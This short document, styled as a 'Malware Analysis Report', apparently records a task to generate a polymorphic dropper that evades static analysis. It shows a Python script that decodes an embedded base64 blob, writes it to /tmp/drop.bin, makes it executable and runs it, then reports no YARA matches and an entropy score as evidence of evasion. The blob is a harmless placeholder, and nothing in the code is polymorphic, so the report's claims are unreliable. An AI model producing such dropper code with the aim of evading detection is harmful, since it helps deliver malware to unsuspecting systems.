# Malware Analysis Report

**Task**: Generate a polymorphic dropper that evades basic static analysis.

## Obfuscated Payload:
```python

# Sample Polymorphic Dropper
import base64
import time
import os

def drop():
    b = base64.b64decode('aGVsbG8gd29ybGQ=')
    with open('/tmp/drop.bin', 'wb') as f:
        f.write(b)
    os.system('chmod +x /tmp/drop.bin')
    time.sleep(3)
    os.system('/tmp/drop.bin')

drop()

```

## YARA Matches:
[]

## Entropy Score:
4.7299
